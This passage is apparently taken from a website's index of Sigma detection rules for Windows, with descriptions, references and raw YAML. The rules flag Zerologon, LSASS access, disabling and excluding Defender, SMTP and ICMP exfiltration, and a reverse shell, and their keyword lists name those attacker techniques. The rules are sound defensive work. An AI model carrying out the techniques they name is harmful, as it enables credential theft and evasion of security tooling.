\u0026#39;SPN attribute\u0026#39; cmd: CommandLine|contains: \u0026#39;-q\u0026#39; condition: (selection_image or selection_desc) and cmd falsepositives: - Administrator Activity level: medium tags: - attack.credential_access - attack.t1558.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_spn_enum.yml/","tags":["attack.credential_access","attack.t1558.003"],"title":"Possible SPN Enumeration"},{"categories":null,"contents":"Detects Netlogon Elevation of Privilege Vulnerability aka Zerologon (CVE-2020-1472)\nKnown false-positives automatic DC computer account password change legitimate DC computer account password change References https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472 https://www.logpoint.com/en/blog/detecting-zerologon-vulnerability-in-logpoint/ Raw rule (edit) title: \u0026#39;Possible Zerologon (CVE-2020-1472) Exploitation\u0026#39; id: dd7876d8-0f09-11eb-adc1-0242ac120002 status: experimental description: Detects Netlogon Elevation of Privilege Vulnerability aka Zerologon (CVE-2020-1472) references: - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472 - https://www.logpoint.com/en/blog/detecting-zerologon-vulnerability-in-logpoint/ author: \u0026#39;Aleksandr Akhremchik, @aleqs4ndr, ocsd.community\u0026#39; date: 2020/10/15 modified: 2021/07/07 tags: - attack.t1068 - attack.privilege_escalation logsource: product: windows service: security detection: selection: EventID: 4742 SubjectUserName: \u0026#39;ANONYMOUS LOGON\u0026#39; TargetUserName: \u0026#39;%DC-MACHINE-NAME%\u0026#39; # DC machine account name that ends with \u0026#39;$\u0026#39; filter: PasswordLastSet: \u0026#39;-\u0026#39; condition: selection and not filter falsepositives: - automatic DC computer account password change - legitimate DC computer account password change level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_privesc_cve_2020_1472.yml/","tags":["attack.t1068","attack.privilege_escalation"],"title":"Possible Zerologon (CVE-2020-1472) Exploitation"},{"categories":null,"contents":"Detects that a powershell code is written to the registry as a service.\nKnown false-positives Unknown References https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse Raw rule (edit) title: PowerShell as a Service in Registry id: 4a5f5a5e-ac01-474b-9b4e-d61298c9df1d description: Detects that a powershell code is written to the registry as a service. status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/06 modified: 2022/01/13 references: - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse tags: - attack.execution - attack.t1569.002 logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject|contains: \u0026#39;\\Services\\\u0026#39; TargetObject|endswith: \u0026#39;\\ImagePath\u0026#39; Details|contains: - \u0026#39;powershell\u0026#39; - \u0026#39;pwsh\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_powershell_as_service.yml/","tags":["attack.execution","attack.t1569.002"],"title":"PowerShell as a Service in Registry"},{"categories":null,"contents":"Detects PowerShell called from an executable by the version mismatch method\nKnown false-positives Penetration Tests Unknown References https://adsecurity.org/?p=2921 Raw rule (edit) title: PowerShell Called from an Executable Version Mismatch id: c70e019b-1479-4b65-b0cc-cd0c6093a599 status: experimental description: Detects PowerShell called from an executable by the version mismatch method references: - https://adsecurity.org/?p=2921 tags: - attack.defense_evasion - attack.execution - attack.t1059.001 author: Sean Metcalf (source), Florian Roth (rule) date: 2017/03/05 modified: 2021/10/16 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection1: EngineVersion|startswith: - \u0026#39;2.\u0026#39; - \u0026#39;4.\u0026#39; - \u0026#39;5.\u0026#39; HostVersion|startswith: \u0026#39;3.\u0026#39; condition: selection1 falsepositives: - Penetration Tests - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_classic/posh_pc_exe_calling_ps.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1059.001"],"title":"PowerShell Called from an Executable Version Mismatch"},{"categories":null,"contents":"Detects PowerShell calling a credential prompt\nKnown false-positives Unknown References https://twitter.com/JohnLaTwC/status/850381440629981184 https://t.co/ezOTGy1a1G Raw rule (edit) title: PowerShell Credential Prompt id: ca8b77a9-d499-4095-b793-5d5f330d450e status: experimental description: Detects PowerShell calling a credential prompt references: - https://twitter.com/JohnLaTwC/status/850381440629981184 - https://t.co/ezOTGy1a1G tags: - attack.credential_access - attack.execution - attack.t1059.001 author: John Lambert (idea), Florian Roth (rule) date: 2017/04/09 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: \u0026#39;PromptForCredential\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_prompt_credentials.yml/","tags":["attack.credential_access","attack.execution","attack.t1059.001"],"title":"PowerShell Credential Prompt"},{"categories":null,"contents":"Detects base64 encoded PowerShell code that modifies Windows Defender\nKnown false-positives Possible Admin Activity Other Cmdlets that may use the same parameters References https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md https://twitter.com/AdamTheAnalyst/status/1483497517119590403 Raw rule (edit) title: Powershell Defender Base64 MpPreference id: c6fb44c6-71f5-49e6-9462-1425d328aee3 status: experimental description: Detects base64 encoded PowerShell code that modifies Windows Defender references: - https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md - https://twitter.com/AdamTheAnalyst/status/1483497517119590403 tags: - attack.defense_evasion - attack.t1562.001 author: Florian Roth date: 2022/03/04 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection_encoded: CommandLine|base64offset|contains: - \u0026#39;Add-MpPreference \u0026#39; - \u0026#39;Set-MpPreference \u0026#39; - \u0026#39;add-mppreference \u0026#39; - \u0026#39;set-mppreference \u0026#39; CommandLine|contains: # UTF16-LE - \u0026#39;QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\u0026#39; - \u0026#39;EAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\u0026#39; - \u0026#39;BAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\u0026#39; - \u0026#39;UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA\u0026#39; - \u0026#39;MAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA\u0026#39; - \u0026#39;TAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA\u0026#39; - \u0026#39;YQBkAGQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\u0026#39; - \u0026#39;EAZABkAC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\u0026#39; - \u0026#39;hAGQAZAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\u0026#39; - \u0026#39;cwBlAHQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA\u0026#39; - \u0026#39;MAZQB0AC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA\u0026#39; - \u0026#39;zAGUAdAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA\u0026#39; condition: selection_encoded falsepositives: - Possible Admin Activity - Other Cmdlets that may use the same parameters level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_defender_base64.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Powershell Defender Base64 MpPreference"},{"categories":null,"contents":"Detects requests to disable Microsoft Defender features using PowerShell commands\nKnown false-positives Possible Admin Activity Other Cmdlets that may use the same parameters References https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps https://www.virustotal.com/gui/file/d609799091731d83d75ec5d1f030571af20c45efeeb94840b67ea09a3283ab65/behavior/C2AE https://www.virustotal.com/gui/search/content%253A%2522Set-MpPreference%2520-Disable%2522/files Raw rule (edit) title: Powershell Defender Disable Scan Feature id: 1ec65a5f-9473-4f12-97da-622044d6df21 status: experimental description: Detects requests to disable Microsoft Defender features using PowerShell commands references: - https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps - https://www.virustotal.com/gui/file/d609799091731d83d75ec5d1f030571af20c45efeeb94840b67ea09a3283ab65/behavior/C2AE - https://www.virustotal.com/gui/search/content%253A%2522Set-MpPreference%2520-Disable%2522/files tags: - attack.defense_evasion - attack.t1562.001 author: Florian Roth date: 2022/03/03 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;Add-MpPreference \u0026#39; - \u0026#39;Set-MpPreference \u0026#39; selection2: CommandLine|contains: - \u0026#39;DisableRealtimeMonitoring \u0026#39; - \u0026#39;DisableIOAVProtection \u0026#39; - \u0026#39;DisableBehaviorMonitoring \u0026#39; - \u0026#39;DisableBlockAtFirstSeen \u0026#39; selection3: CommandLine|contains: - \u0026#39;$true\u0026#39; - \u0026#39; 1 \u0026#39; encoded_command: CommandLine|base64offset|contains: - \u0026#39;DisableRealtimeMonitoring \u0026#39; - \u0026#39;DisableIOAVProtection \u0026#39; - \u0026#39;DisableBehaviorMonitoring \u0026#39; - \u0026#39;DisableBlockAtFirstSeen \u0026#39; - \u0026#39;disablerealtimemonitoring \u0026#39; - \u0026#39;disableioavprotection \u0026#39; - \u0026#39;disablebehaviormonitoring \u0026#39; - \u0026#39;disableblockatfirstseen \u0026#39; CommandLine|contains: - \u0026#39;RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\u0026#39; - \u0026#39;QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\u0026#39; - \u0026#39;EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA\u0026#39; - \u0026#39;RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA\u0026#39; - \u0026#39;QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA\u0026#39; - \u0026#39;EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA\u0026#39; - \u0026#39;RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\u0026#39; - \u0026#39;QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\u0026#39; - \u0026#39;EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA\u0026#39; - \u0026#39;RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA\u0026#39; - \u0026#39;QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA\u0026#39; - \u0026#39;EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA\u0026#39; - \u0026#39;ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\u0026#39; - \u0026#39;QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\u0026#39; - \u0026#39;kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA\u0026#39; - \u0026#39;ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA\u0026#39; - \u0026#39;QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA\u0026#39; - \u0026#39;kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA\u0026#39; - \u0026#39;ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\u0026#39; - \u0026#39;QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\u0026#39; - \u0026#39;kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA\u0026#39; - \u0026#39;ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA\u0026#39; - \u0026#39;QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA\u0026#39; - \u0026#39;kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA\u0026#39; condition: all of selection* or encoded_command falsepositives: - Possible Admin Activity - Other Cmdlets that may use the same parameters level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Powershell Defender Disable Scan Feature"},{"categories":null,"contents":"Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets\nKnown false-positives Possible Admin Activity Other Cmdlets that may use the same parameters References https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md https://twitter.com/AdamTheAnalyst/status/1483497517119590403 Raw rule (edit) title: Powershell Defender Exclusion id: 17769c90-230e-488b-a463-e05c08e9d48f status: experimental description: Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets references: - https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md - https://twitter.com/AdamTheAnalyst/status/1483497517119590403 tags: - attack.defense_evasion - attack.t1562.001 author: Florian Roth date: 2021/04/29 modified: 2022/03/04 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;Add-MpPreference \u0026#39; - \u0026#39;Set-MpPreference \u0026#39; selection2: CommandLine|contains: - \u0026#39; -ExclusionPath \u0026#39; - \u0026#39; -ExclusionExtension \u0026#39; - \u0026#39; -ExclusionProcess \u0026#39; condition: all of selection* falsepositives: - Possible Admin Activity - Other Cmdlets that may use the same parameters level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_defender_exclusion.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Powershell Defender Exclusion"},{"categories":null,"contents":"Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation\nKnown false-positives Administrators or Power users may remove their shares via cmd line References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md Raw rule (edit) title: PowerShell Deleted Mounted Share id: 66a4d409-451b-4151-94f4-a55d559c49b0 status: experimental description: Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md author: \u0026#39;oscd.community, @redcanary, Zach Stanford @svch0st\u0026#39; date: 2020/10/08 modified: 2021/10/16 tags: - attack.defense_evasion - attack.t1070.005 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - \u0026#39;Remove-SmbShare\u0026#39; - \u0026#39;Remove-FileShare\u0026#39; condition: selection falsepositives: - Administrators or Power users may remove their shares via cmd line level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_mounted_share_deletion.yml/","tags":["attack.defense_evasion","attack.t1070.005"],"title":"PowerShell Deleted Mounted Share"},{"categories":null,"contents":"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1497.001/T1497.001.md https://techgenix.com/malicious-powershell-scripts-evade-detection/ Raw rule (edit) title: Powershell Detect Virtualization Environment id: d93129cd-1ee0-479f-bc03-ca6f129882e3 status: experimental author: frack113, Duc.Le-GTSC date: 2021/08/03 modified: 2022/03/03 description: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1497.001/T1497.001.md - https://techgenix.com/malicious-powershell-scripts-evade-detection/ tags: - attack.defense_evasion - attack.t1497.001 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection_action: ScriptBlockText|contains: - Get-WmiObject - gwmi selection_module: ScriptBlockText|contains: - MSAcpi_ThermalZoneTemperature - Win32_ComputerSystem condition: all of selection* falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_detect_vm_env.yml/","tags":["attack.defense_evasion","attack.t1497.001"],"title":"Powershell Detect Virtualization Environment"},{"categories":null,"contents":"Detects suspicious encoded character syntax often used for defense evasion\nKnown false-positives Unknown References https://twitter.com/0gtweet/status/1281103918693482496 Raw rule (edit) title: PowerShell Encoded Character Syntax id: e312efd0-35a1-407f-8439-b8d434b438a6 status: test description: Detects suspicious encoded character syntax often used for defense evasion author: Florian Roth references: - https://twitter.com/0gtweet/status/1281103918693482496 date: 2020/07/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;(WCHAR)0x\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_powershell_encoded_param.yml/","tags":["attack.execution","attack.t1059.001","attack.defense_evasion","attack.t1027"],"title":"PowerShell Encoded Character Syntax"},{"categories":null,"contents":"Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system\nKnown false-positives legitim administration script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.003/T1059.003.md#atomic-test-1---create-and-execute-batch-script Raw rule (edit) title: Powershell Execute Batch Script id: b5522a23-82da-44e5-9c8b-e10ed8955f88 description: | Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.003/T1059.003.md#atomic-test-1---create-and-execute-batch-script status: experimental author: frack113 date: 2022/01/02 logsource: product: windows category: ps_script detection: selection_start: ScriptBlockText|contains: Start-Process selection_batch: ScriptBlockText|contains: - \u0026#39;.cmd\u0026#39; - \u0026#39;.bat\u0026#39; condition: all of selection_* falsepositives: - legitim administration script level: medium tags: - attack.execution - attack.t1059.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_execute_batch_script.yml/","tags":["attack.execution","attack.t1059.003"],"title":"Powershell Execute Batch Script"},{"categories":null,"contents":"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\nKnown false-positives legitim script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.2 https://www.ietf.org/rfc/rfc2821.txt Raw rule (edit) title: Powershell Exfiltration Over SMTP id: 9a7afa56-4762-43eb-807d-c3dc9ffe211b status: experimental description: | Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.2 - https://www.ietf.org/rfc/rfc2821.txt author: frack113 date: 2022/01/07 logsource: product: windows category: ps_script definition: \u0026#39;Script block logging must be enabled\u0026#39; detection: selection_cmdlet: ScriptBlockText|contains: Send-MailMessage condition: selection_cmdlet falsepositives: - legitim script level: medium tags: - attack.exfiltration - attack.t1048.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_send_mailmessage.yml/","tags":["attack.exfiltration","attack.t1048.003"],"title":"Powershell Exfiltration Over SMTP"},{"categories":null,"contents":"Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity\nKnown false-positives Unknown References https://twitter.com/PythonResponder/status/1385064506049630211 Raw rule (edit) title: PowerShell Get-Process LSASS id: b2815d0d-7481-4bf0-9b6c-a4c48a94b349 description: Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity status: experimental references: - https://twitter.com/PythonResponder/status/1385064506049630211 author: Florian Roth date: 2021/04/23 tags: - attack.credential_access - attack.t1552.004 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;Get-Process lsass\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_powershell_getprocess_lsass.yml/","tags":["attack.credential_access","attack.t1552.004"],"title":"PowerShell Get-Process LSASS"},{"categories":null,"contents":"Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity\nKnown false-positives Legitimate certificate exports invoked by administrators or users (depends on processes in the environment - filter if unusable) References https://twitter.com/PythonResponder/status/1385064506049630211 Raw rule (edit) title: PowerShell Get-Process LSASS in ScriptBlock id: 84c174ab-d3ef-481f-9c86-a50d0b8e3edb status: experimental description: Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity references: - https://twitter.com/PythonResponder/status/1385064506049630211 tags: - attack.credential_access - attack.t1003.001 author: Florian Roth date: 2021/04/23 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script Block Logging must be enable detection: select_LSASS: ScriptBlockText|contains: \u0026#39;Get-Process lsass\u0026#39; condition: select_LSASS falsepositives: - Legitimate certificate exports invoked by administrators or users (depends on processes in the environment - filter if unusable) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_getprocess_lsass.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"PowerShell Get-Process LSASS in ScriptBlock"},{"categories":null,"contents":"Detects Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.\nKnown false-positives Legitimate usage of System.Net.NetworkInformation.Ping class References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-2---exfiltration-over-alternative-protocol---icmp Raw rule (edit) title: PowerShell ICMP Exfiltration id: 4c4af3cd-2115-479c-8193-6b8bfce9001c status: experimental description: Detects Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-2---exfiltration-over-alternative-protocol---icmp author: \u0026#39;Bartlomiej Czyz @bczyz1, oscd.community\u0026#39; date: 2020/10/10 modified: 2021/10/16 tags: - attack.exfiltration - attack.t1048.003 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;New-Object\u0026#39; - \u0026#39;System.Net.NetworkInformation.Ping\u0026#39; - \u0026#39;.Send(\u0026#39; condition: selection falsepositives: - Legitimate usage of System.Net.NetworkInformation.Ping class level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_icmp_exfiltration.yml/","tags":["attack.exfiltration","attack.t1048.003"],"title":"PowerShell ICMP Exfiltration"},{"categories":null,"contents":"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code\nKnown false-positives legitimate administrative script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-7---powershell-msxml-com-object---with-prompt https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms766431(v=vs.85) Raw rule (edit) title: Powershell MsXml COM Object id: 78aa1347-1517-4454-9982-b338d6df8343 status: experimental description: | Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code author: frack113 date: 2022/01/19 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-7---powershell-msxml-com-object---with-prompt - https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms766431(v=vs.85) logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - New-Object - \u0026#39;-ComObject\u0026#39; - MsXml2.ServerXmlHttp condition: selection falsepositives: - legitimate administrative script level: medium tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_msxml_com.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Powershell MsXml COM Object"},{"categories":null,"contents":"Detects the use of PSAttack PowerShell hack tool\nKnown false-positives Pentesters References https://adsecurity.org/?p=2921 Raw rule (edit) title: PowerShell PSAttack id: b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5 status: experimental description: Detects the use of PSAttack PowerShell hack tool references: - https://adsecurity.org/?p=2921 tags: - attack.execution - attack.t1059.001 author: Sean Metcalf (source), Florian Roth (rule) date: 2017/03/05 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: \u0026#39;PS ATTACK!!!\u0026#39; condition: selection falsepositives: - Pentesters level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_psattack.yml/","tags":["attack.execution","attack.t1059.001"],"title":"PowerShell PSAttack"},{"categories":null,"contents":"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system\nKnown false-positives legitimate administrative script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-10---powershell-invoke-downloadcradle https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.2 Raw rule (edit) title: PowerShell Remote Session Creation id: a0edd39f-a0c6-4c17-8141-261f958e8d8f status: experimental description: | Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-10---powershell-invoke-downloadcradle - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.2 author: frack113 date: 2022/01/06 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - New-PSSession - \u0026#39;-ComputerName \u0026#39; condition: selection falsepositives: - legitimate administrative script level: medium tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_remote_session_creation.yml/","tags":["attack.execution","attack.t1059.001"],"title":"PowerShell Remote Session Creation"},{"categories":null,"contents":"Detects the Nishang Invoke-PowerShellTcpOneLine reverse shell\nKnown false-positives Administrative might use this function for checking network connectivity References https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ Raw rule (edit) title: Powershell Reverse Shell Connection id: edc2f8ae-2412-4dfd-b9d5-0c57727e70be status: experimental description: Detects the Nishang Invoke-PowerShellTcpOneLine reverse shell author: FPT.EagleEye, wagga references: - https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ date: 2021/03/03 modified: 2021/06/27 tags: - 